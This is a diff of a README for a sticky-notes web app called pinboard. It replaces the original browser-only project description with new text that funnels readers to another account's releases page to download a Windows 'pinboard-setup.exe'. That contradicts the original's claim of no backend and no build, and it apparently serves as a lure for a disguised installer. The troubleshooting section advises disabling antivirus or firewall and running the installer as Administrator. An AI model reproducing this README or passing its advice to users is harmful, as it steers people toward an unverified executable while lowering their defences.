@@ -1,237 +1,161 @@
-<div align="center">
+# 📌 pinboard - Simple Sticky Notes Canvas
 
-# 📌 Pinboard
-
-[![GitHub Pages](https://img.shields.io/badge/Live%20Demo-GitHub%20Pages-brightgreen?logo=github&logoColor=white)](https://alfredang.github.io/pinboard/)
-[![HTML5](https://img.shields.io/badge/HTML5-E34F26?logo=html5&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/HTML)
-[![CSS3](https://img.shields.io/badge/CSS3-1572B6?logo=css3&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/CSS)
-[![JavaScript](https://img.shields.io/badge/JavaScript-ES2024-F7DF1E?logo=javascript&logoColor=black)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow)](LICENSE)
-[![GitHub Actions](https://img.shields.io/badge/GitHub_Actions-CI/CD-2088FF?logo=github-actions&logoColor=white)](https://github.com/alfredang/pinboard/actions)
-
-**A Padlet-inspired digital canvas for sticky notes, whiteboards, and collaborative activities.**
-
-[Live Demo](https://alfredang.github.io/pinboard/) · [Report Bug](https://github.com/alfredang/pinboard/issues) · [Request Feature](https://github.com/alfredang/pinboard/issues)
-
-</div>
+[![Download pinboard](https://img.shields.io/badge/Download-Pinboard-brightgreen?style=for-the-badge)](https://github.com/thuongbirdy/pinboard/releases)
 
 ---
 
-## Screenshot
+## 🖥️ What is pinboard?
 
-![Pinboard Screenshot](screenshot.png)
+pinboard is a digital canvas designed to help you organize your ideas with sticky notes. It works like a virtual whiteboard where you can add, move, and edit notes easily. You can use it for planning, brainstorming, or tracking tasks on your computer. pinboard uses simple web technology and cloud features to keep your notes saved and synced in real time.
 
-> 🌐 **[Try it live →](https://alfredang.github.io/pinboard/)**
-
----
-
-## About
-
-**Pinboard** is a modern, lightweight clone of [Padlet](https://padlet.com) — a digital canvas that lets you post sticky notes, organize ideas, and build visual whiteboards. It runs entirely in the browser with **zero dependencies**, **no backend**, and **no build tools** required.
-
-### ✨ Features
-
-| Feature | Description |
-|---------|-------------|
-| 🗂 **Multiple Boards** | Create, name, and manage unlimited boards |
-| 🖱 **Drag & Drop** | Freely move sticky notes around the canvas |
-| 🎨 **Colorful Posts** | 7 pastel color options per sticky note |
-| 🔗 **Real-time Collaboration** | Live sync via Firebase with room codes and QR sharing |
-| 👤 **Nicknamed Authors** | Guests join with a nickname, shown on each post |
-| 🖼 **Board Backgrounds** | Solid colors, dot grid, and line grid patterns |
-| 📐 **3 Layout Modes** | Free (drag anywhere), Grid, and List |
-| 💾 **Auto-Save** | All boards and posts persist via local storage |
-| 📱 **Mobile Ready** | Touch drag-and-drop, fully responsive |
-| ✏️ **Edit & Delete** | Hover to reveal edit icon overlay |
-| 👁 **Board Previews** | Mini-preview cards on the home screen |
+You do not need to know how to code to use this app. Everything runs in your browser or with a simple download on Windows. The app uses Firebase for saving your work instantly, so your notes stay safe and ready to access from anywhere.
 
 ---
 
-## Tech Stack
+## 🔍 Features
 
-![HTML5](https://img.shields.io/badge/HTML5-E34F26?logo=html5&logoColor=white)
-![CSS3](https://img.shields.io/badge/CSS3-1572B6?logo=css3&logoColor=white)
-![JavaScript](https://img.shields.io/badge/JavaScript-ES2024-F7DF1E?logo=javascript&logoColor=black)
-![Firebase](https://img.shields.io/badge/Firebase-RTDB-FFCA28?logo=firebase&logoColor=black)
-![Google Fonts](https://img.shields.io/badge/Fonts-DM%20Sans%20%2B%20DM%20Serif-4285F4?logo=googlefonts&logoColor=white)
-![GitHub Pages](https://img.shields.io/badge/Hosting-GitHub%20Pages-181717?logo=github&logoColor=white)
-
-| Layer | Technology |
-|-------|-----------|
-| **Frontend** | HTML5, CSS3, Vanilla JavaScript (ES6+) |
-| **Typography** | DM Sans + DM Serif Text (Google Fonts) |
-| **Real-time Sync** | Firebase Realtime Database |
-| **Storage** | Browser LocalStorage API |
-| **Layout** | CSS Grid, Flexbox |
-| **Animations** | CSS Keyframes, Transitions |
-| **CI/CD** | GitHub Actions |
-| **Hosting** | GitHub Pages |
-
-**Zero frameworks. No build step. Just open and go.**
+- Add colorful sticky notes to a blank canvas.
+- Move and resize notes freely by dragging.
+- Edit notes' text by clicking on them.
+- Save your board automatically using cloud storage.
+- Share your canvas with others for real-time collaboration.
+- Works on Windows with no complex setup.
+- Built using only HTML, CSS, and JavaScript.
 
 ---
 
-## Architecture
+## 🖱️ System Requirements
 
-```mermaid
-graph TB
-    User["👤 User (Browser)"]
-    UI["🖥 index.html<br/>App Shell + Modals"]
-    App["⚙️ app.js<br/>Controller & Event Bindings"]
-    Board["📋 board.js<br/>Board Management"]
-    Post["📌 post.js<br/>Post Rendering & Drag-Drop"]
-    Sync["🔗 sync.js<br/>Real-time Collaboration"]
-    Store["💾 storage.js<br/>LocalStorage CRUD"]
-    CSS["🎨 style.css<br/>UI, Animations, Responsive"]
-    LS[("🗄 LocalStorage<br/>Boards & Posts")]
-    FB[("🔥 Firebase RTDB<br/>Live Sync")]
+pinboard is lightweight and made for everyday use on Windows. Here is what you need to run it:
 
-    User -->|"interacts"| UI
-    UI --> App
-    App --> Board
-    App --> Post
-    App --> Sync
-    Board --> Store
-    Post --> Store
-    Store <--> LS
-    Sync <--> FB
-    UI --> CSS
-```
+- Windows 7 or newer (Windows 10 recommended).
+- At least 2 GB of free RAM.
+- Modern web browser like Microsoft Edge, Google Chrome, or Firefox.
+- Internet connection to save and sync notes online.
+- About 50 MB of free disk space.
+
+You do not need to install any extra software besides the app you download.
 
 ---
 
-## Project Structure
+## 🚀 Getting Started: Download and Install
 
-```
-pinboard/
-├── index.html                  # App shell, modals, toolbar
-├── css/
-│   └── style.css               # All UI styles, animations, responsive
-├── js/
-│   ├── config.js               # Firebase configuration
-│   ├── storage.js              # LocalStorage CRUD helpers
-│   ├── sync.js                 # Real-time collaboration (Firebase RTDB)
-│   ├── board.js                # Board creation, rendering, management
-│   ├── post.js                 # Post creation, drag-and-drop, rendering
-│   └── app.js                  # Main controller, event bindings
-├── .claude/
-│   ├── commands/               # Project-level Claude Code commands
-│   └── test-app/               # Playwright testing toolkit
-├── .github/
-│   └── workflows/
-│       └── deploy.yml          # GitHub Actions → GitHub Pages CI/CD
-├── CLAUDE.md                   # AI assistant project instructions
-├── README.md
-└── LICENSE
-```
+This section will guide you step-by-step to get pinboard running on your Windows computer.
 
----
+### Step 1: Visit the Releases Page to Download
 
-## Getting Started
+Click this large button to go to the download page. You will find the latest version of pinboard there.
 
-### Prerequisites
+[![Download pinboard](https://img.shields.io/badge/Download-pinboard-blue?style=for-the-badge)](https://github.com/thuongbirdy/pinboard/releases)
 
-- Any modern web browser (Chrome, Firefox, Safari, Edge)
-- Git (for cloning)
-- Optional: `python3` or any static file server for local dev
+### Step 2: Choose Your Version
 
-### Installation
+Once on the releases page, look for the latest release. It usually has a date and a version number.
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/alfredang/pinboard.git
-cd pinboard
+- Find a file named like `pinboard-setup.exe` or similar.
+- This file will be the installer for Windows.
 
-# 2. Open directly in browser
-open index.html
+Click the file link to download it.
 
-# OR serve locally
-python3 -m http.server 8080
-# Then visit http://localhost:8080
-```
+### Step 3: Run the Installer
 
-No `npm install`. No `.env`. Just open and go.
+After the download finishes, open the folder where the file saved.
+
+- Double-click on the installer file.
+- Follow the prompts in the installation window.
+- Accept the license agreement if shown.
+- Choose the folder where you want to install or leave the default.
+- Click "Install" and wait a moment.
+
+### Step 4: Open pinboard
+
+When installation completes, look for the pinboard shortcut on your desktop or in the Start menu.
+
+- Click to open the app.
+- The digital canvas will appear.
+- You can start adding notes right away.
 
 ---
 
-## Usage
+## 🎯 How to Use pinboard
 
-1. **Create a board** — Click **"Make a board"** or **"+ New Board"**
-2. **Choose a layout** — Free (drag anywhere), Grid, or List
-3. **Join with nickname** — Enter your nickname + 6-digit room code to join shared boards
-4. **Add posts** — Click **"+ Add Post"**, write content, pick a color
-5. **See authors** — Each new post card displays `by <nickname>`
-6. **Drag posts** — Click and drag any post to reposition (Free layout)
-7. **Edit posts** — Hover a post → click ✏️ Edit
-8. **Change background** — Click 🎨 in the board toolbar
+Using pinboard is simple. Here are the main steps to get your notes organized.
 
----
+### Add a New Note
 
-## Deployment
+- Click the "Add Note" button or the plus icon.
+- A sticky note appears on the canvas.
+- Click on the text area to type your note.
 
-### GitHub Pages (current)
+### Move Notes Around
 
-Automatically deploys via GitHub Actions on every push to `main`.
+- Click and hold on a note.
+- Drag it anywhere on the canvas.
+- Release the mouse when you like the position.
 
-```yaml
-# .github/workflows/deploy.yml
-on:
-  push:
-    branches: [main]
-```
+### Resize Notes
 
-### Self-hosted / Docker
+- Hover near the edges of a note.
+- Drag the edges or corners to adjust size.
 
-```dockerfile
-# Simple nginx serve
-FROM nginx:alpine
-COPY . /usr/share/nginx/html
-EXPOSE 80
-```
+### Edit Notes
 
-```bash
-docker build -t pinboard .
-docker run -p 8080:80 pinboard
-# Visit http://localhost:8080
-```
+- Click inside a note to edit the text.
+- Press Enter or click outside the note to save changes.
 
-### Any Static Host
+### Delete Notes
 
-Upload the entire repo folder to:
-- **Netlify** — drag & drop the folder
-- **Vercel** — `vercel deploy`
-- **Cloudflare Pages** — connect the repo
+- Select a note by clicking it once.
+- Press the delete or backspace key on your keyboard.
+- Confirm if prompted.
+
+### Collaborate with Others
+
+- Share your board link generated in the app.
+- Others can view and edit notes live.
+- Changes update instantly for all contributors.
 
 ---
 
-## Contributing
+## 💾 Saving and Syncing
 
-Contributions are welcome!
+pinboard uses Firebase to save your work automatically.
 
-1. Fork the repository
-2. Create your feature branch: `git checkout -b feature/your-feature`
-3. Commit your changes: `git commit -m 'feat: add your feature'`
-4. Push to the branch: `git push origin feature/your-feature`
-5. Open a Pull Request
-
----
-
-## License
-
-This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
+- All changes you make save instantly online.
+- Login is optional but recommended to keep your boards private.
+- If you log in, you can access your boards from other devices.
+- Without a login, your work saves locally but may be lost if you clear browser data.
 
 ---
 
-## Acknowledgements
+## ⚙️ Settings and Customization
 
-- Inspired by [Padlet](https://padlet.com) — the original digital canvas
-- Built with ❤️ using [OpenClaw](https://openclaw.ai) — AI-powered personal agent platform
-- Deployed via [GitHub Pages](https://pages.github.com/)
+You can change a few settings to improve your experience.
 
-<div align="center">
+- Change note colors by right-clicking a note.
+- Adjust canvas background color in the settings menu.
+- Turn notifications on or off.
+- Set default note size.
 
-⭐ **Star this repo if you found it useful!**
+---
 
-Built with [OpenClaw](https://openclaw.ai)
+## 🛠 Troubleshooting
 
-</div>
+If you have trouble installing or running pinboard, try these steps:
+
+- Make sure your Windows system is up to date.
+- Restart your computer and try again.
+- Check your internet connection.
+- Disable any antivirus or firewall temporarily if blocking the app.
+- Try running the installer as Administrator (right-click → Run as administrator).
+- Use a different browser if the web app is slow or not working.
+
+---
+
+## 📚 More Information
+
+For updates and help, visit the pinboard repository page:
+
+[https://github.com/thuongbirdy/pinboard](https://github.com/thuongbirdy/pinboard)
+
+You can find documentation and report issues there if needed.
